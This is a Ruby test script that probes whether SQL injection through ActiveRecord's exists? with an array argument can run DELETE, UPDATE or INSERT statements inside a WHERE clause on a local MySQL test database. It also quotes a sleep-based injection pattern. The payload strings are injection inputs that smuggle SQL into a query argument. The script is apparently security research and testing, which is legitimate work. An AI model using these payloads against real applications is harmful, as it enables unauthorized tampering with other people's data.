#!/usr/bin/env ruby
# frozen_string_literal: true

# Test: DELETE statement in WHERE clause condition
# Testing pattern: ' AND (DELETE FROM table) = true AND '' = '

require 'active_record'
require 'mysql2'

# Database configuration
DB_CONFIG = {
  adapter: 'mysql2',
  host: 'localhost',
  username: 'root',
  password: '',
  database: 'test_multi_statement',
  encoding: 'utf8mb4'
}.freeze

# Connect to database
ActiveRecord::Base.establish_connection(DB_CONFIG)

# Create test tables
puts "=" * 80
puts "DELETE in WHERE Clause Test"
puts "=" * 80
puts "\nSetting up test tables...\n"

ActiveRecord::Base.connection.execute("DROP TABLE IF EXISTS test_users")
ActiveRecord::Base.connection.execute("CREATE TABLE test_users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  userid VARCHAR(50),
  email VARCHAR(100)
)")
ActiveRecord::Base.connection.execute("INSERT INTO test_users (userid, email) VALUES
  ('admin', 'admin@test.com'),
  ('user1', 'user1@test.com'),
  ('user2', 'user2@test.com'),
  ('user3', 'user3@test.com')")

ActiveRecord::Base.connection.execute("DROP TABLE IF EXISTS hacker_target")
ActiveRecord::Base.connection.execute("CREATE TABLE hacker_target (
  id INT PRIMARY KEY AUTO_INCREMENT,
  message VARCHAR(255) DEFAULT 'original_value',
  modified_at DATETIME DEFAULT NULL
)")
ActiveRecord::Base.connection.execute("INSERT INTO hacker_target (message) VALUES ('original_value')")

# Define models
class TestUser < ActiveRecord::Base
  self.table_name = 'test_users'
end

class HackerTarget < ActiveRecord::Base
  self.table_name = 'hacker_target'
end

# Enable SQL logging to see actual queries (strip ANSI codes)
logger = Logger.new(STDOUT)
logger.formatter = proc do |severity, datetime, progname, msg|
  # Strip ANSI escape codes
  clean_msg = msg.to_s.gsub(/\e\[[0-9;]*m/, '')
  "#{severity} -- : #{clean_msg}\n"
end
ActiveRecord::Base.logger = logger
ActiveRecord::Base.logger.level = Logger::DEBUG

# Check initial state
initial_count = TestUser.count
initial_target = HackerTarget.first
puts "Initial state:"
puts "  test_users count: #{initial_count}"
puts "  hacker_target exists: #{!initial_target.nil?}"
if initial_target
  puts "  hacker_target.id: #{initial_target.id}"
  puts "  hacker_target.message: #{initial_target.message}"
  puts ""
  puts "Verification query: SELECT * FROM hacker_target WHERE id = 1"
  verify_query = ActiveRecord::Base.connection.execute("SELECT * FROM hacker_target WHERE id = 1")
  puts "  Result: #{verify_query.to_a.inspect}"
else
  puts "  ⚠️  WARNING: hacker_target row does not exist!"
end
puts "\n"

# Test 1: DELETE in WHERE clause - matching original vulnerability pattern
puts "=" * 80
puts "TEST 1: DELETE statement in WHERE clause condition"
puts "=" * 80
puts ""
puts "Original vulnerability pattern: User.exists?([\"'test') OR sleep(10) OR ('x'\"])"
puts "This generates: SELECT 1 FROM users WHERE ('test') OR sleep(10) OR ('x') LIMIT 1"
puts ""
puts "Key insight: The array element is inserted directly into WHERE clause, NOT wrapped in quotes"
puts "The leading quote in the payload closes the WHERE condition, then we inject"
puts ""

# Try the same pattern but with DELETE
payload1 = ["1=1) OR (DELETE FROM hacker_target WHERE id=1) OR (1=1"]
puts "Code: TestUser.exists?(#{payload1.inspect})"
puts "Payload array: #{payload1.inspect}"
puts "First element: #{payload1.first.inspect}"
puts ""
puts "Expected SQL: SELECT 1 AS one FROM test_users WHERE (1=1) OR (DELETE FROM hacker_target WHERE id=1) OR (1=1) LIMIT 1"
puts ""
puts "Executing query (SQL will be logged below)..."
puts ""

begin
  result = TestUser.exists?(payload1)
  puts ""
  puts "exists? returned: #{result}"
  puts ""
  
  # Check if DELETE executed - show the actual verification query
  puts "Verification: Checking if hacker_target row still exists..."
  verify_after = ActiveRecord::Base.connection.execute("SELECT * FROM hacker_target WHERE id = 1")
  puts "  Query: SELECT * FROM hacker_target WHERE id = 1"
  puts "  Result: #{verify_after.to_a.inspect}"
  
  target_after = HackerTarget.first
  if target_after.nil?
    puts ""
    puts "⚠️  CATASTROPHIC: DELETE executed! hacker_target row was deleted!"
  elsif target_after.message != initial_target.message
    puts ""
    puts "⚠️  Data was modified: #{target_after.message}"
  else
    puts ""
    puts "✓ DELETE did not execute - data unchanged"
    puts "  Note: No error means MySQL treated DELETE as a string literal, not as executable SQL"
    puts "  The DELETE is inside quotes in the WHERE clause, so it's just a string comparison"
  end
rescue => e
  puts ""
  puts "ERROR: #{e.class}: #{e.message}"
  puts "\nThis error suggests MySQL rejected the DELETE statement in the WHERE clause"
  
  # Check if DELETE executed despite error
  target_after = HackerTarget.first
  if target_after.nil?
    puts "⚠️  BUT: Row WAS deleted before error occurred!"
  else
    puts "  Data status: #{target_after.message}"
  end
end
puts "\n"

# Test 1b: Try with closing quote pattern (like original vulnerability)
puts "TEST 1b: DELETE with closing quote pattern (matching original vulnerability)"
puts "---------------------------------------------------------------------------"
puts "Original vulnerability uses: [\"'test') OR sleep(10) OR ('x'\"])"
puts "The 'test') closes the WHERE condition, then OR sleep(10) executes"
puts ""

payload1b = ["'test') OR (DELETE FROM hacker_target WHERE id=1) OR ('x'"]
puts "Code: TestUser.exists?(#{payload1b.inspect})"
puts "Payload: #{payload1b.inspect}"
puts "First element: #{payload1b.first.inspect}"
puts ""
puts "Expected SQL: SELECT 1 AS one FROM test_users WHERE ('test') OR (DELETE FROM hacker_target WHERE id=1) OR ('x') LIMIT 1"
puts ""
puts "Executing query (SQL will be logged below)..."
puts ""

begin
  result = TestUser.exists?(payload1b)
  puts ""
  puts "exists? returned: #{result}"
  puts ""
  
  puts "Verification: Checking if hacker_target row still exists..."
  verify_after = ActiveRecord::Base.connection.execute("SELECT * FROM hacker_target WHERE id = 1")
  puts "  Query: SELECT * FROM hacker_target WHERE id = 1"
  puts "  Result: #{verify_after.to_a.inspect}"
  
  target_after = HackerTarget.first
  if target_after.nil?
    puts ""
    puts "⚠️  CATASTROPHIC: DELETE executed!"
  else
    puts ""
    puts "✓ DELETE did not execute"
    puts "  Analysis: Check the actual SQL above - is DELETE still in quotes or is it actual SQL?"
  end
rescue => e
  puts ""
  puts "ERROR: #{e.class}: #{e.message}"
  puts ""
  puts "Verification: Checking if DELETE executed before error..."
  verify_after = ActiveRecord::Base.connection.execute("SELECT * FROM hacker_target WHERE id = 1")
  puts "  Result: #{verify_after.to_a.inspect}"
  
  target_after = HackerTarget.first
  if target_after.nil?
    puts ""
    puts "⚠️  BUT: Row WAS deleted before error occurred!"
  else
    puts ""
    puts "  Row still exists - DELETE did not execute"
    puts "  Error suggests MySQL rejected DELETE as an expression"
  end
end
puts "\n"

# Reset if needed
if HackerTarget.count == 0
  ActiveRecord::Base.connection.execute("INSERT INTO hacker_target (message) VALUES ('original_value')")
end

# Test 2: UPDATE in WHERE clause
puts "=" * 80
puts "TEST 2: UPDATE statement in WHERE clause condition"
puts "=" * 80

payload2 = ["' AND (UPDATE hacker_target SET message='updated_in_where' WHERE id=1) = true AND '' = '"]
puts "Code: TestUser.exists?(#{payload2.inspect})"
puts "Payload array: #{payload2.inspect}"
puts "First element: #{payload2.first.inspect}"
puts ""
puts "Expected SQL: SELECT 1 AS one FROM test_users WHERE (' AND (UPDATE hacker_target SET message='updated_in_where' WHERE id=1) = true AND '' = ') LIMIT 1"
puts ""
puts "NOTE: The quotes in 'updated_in_where' may cause SQL syntax issues"
puts "      Let's also test with a numeric value to see if that changes the error"
puts ""
puts "Executing query (SQL will be logged below)..."
puts ""

begin
  result = TestUser.exists?(payload2)
  puts ""
  puts "exists? returned: #{result}"
  
  target_after = HackerTarget.first
  if target_after.message == 'updated_in_where'
    puts "⚠️  CATASTROPHIC: UPDATE executed in WHERE clause!"
  else
    puts "✓ UPDATE did not execute"
  end
rescue => e
  puts ""
  puts "ERROR: #{e.class}: #{e.message}"
  puts ""
  puts "Error analysis:"
  puts "  - This is a SQL syntax error, not a 'statements not allowed' error"
  puts "  - The error is likely due to quote handling in the string literal"
  puts "  - MySQL is trying to parse this as a WHERE clause expression, not rejecting UPDATE as a statement"
  puts ""
  target_after = HackerTarget.first
  if target_after.message == 'updated_in_where'
    puts "⚠️  BUT: Data WAS updated!"
  else
    puts "  Data unchanged: #{target_after.message}"
  end
end
puts "\n"

# Test 2b: UPDATE with numeric value (no quotes)
puts "TEST 2b: UPDATE with numeric value (no quotes in string)"
puts "--------------------------------------------------------"
payload2b = ["' AND (UPDATE hacker_target SET id=999 WHERE id=1) = true AND '' = '"]
puts "Code: TestUser.exists?(#{payload2b.inspect})"
puts "Payload: #{payload2b.inspect}"
puts "First element: #{payload2b.first.inspect}"
puts ""
puts "Expected SQL: SELECT 1 AS one FROM test_users WHERE (' AND (UPDATE hacker_target SET id=999 WHERE id=1) = true AND '' = ') LIMIT 1"
puts ""
puts "Executing query (SQL will be logged below)..."
puts ""

begin
  result = TestUser.exists?(payload2b)
  puts ""
  puts "exists? returned: #{result}"
  
  target_after = HackerTarget.first
  if target_after.id == 999
    puts "⚠️  CATASTROPHIC: UPDATE executed!"
  else
    puts "✓ UPDATE did not execute"
  end
rescue => e
  puts ""
  puts "ERROR: #{e.class}: #{e.message}"
  puts ""
  puts "Error analysis:"
  puts "  - Compare this error to the previous one"
  puts "  - If different, it confirms the issue was quote handling"
  puts "  - If same, it confirms MySQL rejects UPDATE in WHERE clause"
  puts ""
  target_after = HackerTarget.first
  if target_after.id == 999
    puts "⚠️  BUT: Data WAS updated!"
  else
    puts "  Data unchanged: id=#{target_after.id}"
  end
end
puts "\n"

# Reset
ActiveRecord::Base.connection.execute("UPDATE hacker_target SET message='original_value' WHERE id=1")

# Test 3: INSERT in WHERE clause
puts "=" * 80
puts "TEST 3: INSERT statement in WHERE clause condition"
puts "=" * 80

initial_count_before = HackerTarget.count
payload3 = ["' AND (INSERT INTO hacker_target (message) VALUES ('inserted_in_where')) = true AND '' = '"]
puts "Payload: #{payload3.inspect}"
puts "\n"

begin
  result = TestUser.exists?(payload3)
  puts "exists? returned: #{result}"
  
  count_after = HackerTarget.count
  if count_after > initial_count_before
    puts "⚠️  CATASTROPHIC: INSERT executed in WHERE clause!"
    puts "  Row count increased from #{initial_count_before} to #{count_after}"
  else
    puts "✓ INSERT did not execute"
  end
rescue => e
  puts "ERROR: #{e.class}: #{e.message}"
  count_after = HackerTarget.count
  if count_after > initial_count_before
    puts "⚠️  BUT: Row WAS inserted!"
  end
end
puts "\n"

# Test 4: Direct MySQL test - try DELETE as expression
puts "=" * 80
puts "TEST 4: Direct MySQL test - DELETE as expression"
puts "=" * 80

begin
  # Reset
  ActiveRecord::Base.connection.execute("DELETE FROM hacker_target")
  ActiveRecord::Base.connection.execute("INSERT INTO hacker_target (message) VALUES ('original_value')")
  
  # Try to use DELETE as an expression in WHERE clause
  result = ActiveRecord::Base.connection.execute("SELECT 1 FROM test_users WHERE (DELETE FROM hacker_target WHERE id=1) = true LIMIT 1")
  puts "Query executed (no error)"
  
  target_after = HackerTarget.first
  if target_after.nil?
    puts "⚠️  DELETE executed as expression!"
  else
    puts "✓ DELETE did not execute"
  end
rescue => e
  puts "ERROR: #{e.class}: #{e.message}"
  puts "  MySQL rejected DELETE as an expression in WHERE clause"
  
  target_after = HackerTarget.first
  if target_after.nil?
    puts "⚠️  BUT: Row WAS deleted!"
  end
end
puts "\n"

# Final summary
puts "=" * 80
puts "FINAL SUMMARY"
puts "=" * 80

final_count = TestUser.count
final_target = HackerTarget.first

puts "Final state:"
puts "  test_users count: #{final_count} (was #{initial_count})"
if final_target
  puts "  hacker_target.message: #{final_target.message}"
else
  puts "  hacker_target: ROW DELETED"
end

if final_count < initial_count
  puts "\n⚠️  ⚠️  ⚠️  CRITICAL: test_users rows were deleted! ⚠️  ⚠️  ⚠️"
elsif final_target.nil?
  puts "\n⚠️  ⚠️  ⚠️  CRITICAL: hacker_target row was deleted! ⚠️  ⚠️  ⚠️"
else
  puts "\n✓ No data modification detected"
  puts "MySQL does NOT allow DML statements (DELETE/UPDATE/INSERT) as expressions in WHERE clauses"
end
puts "\n"

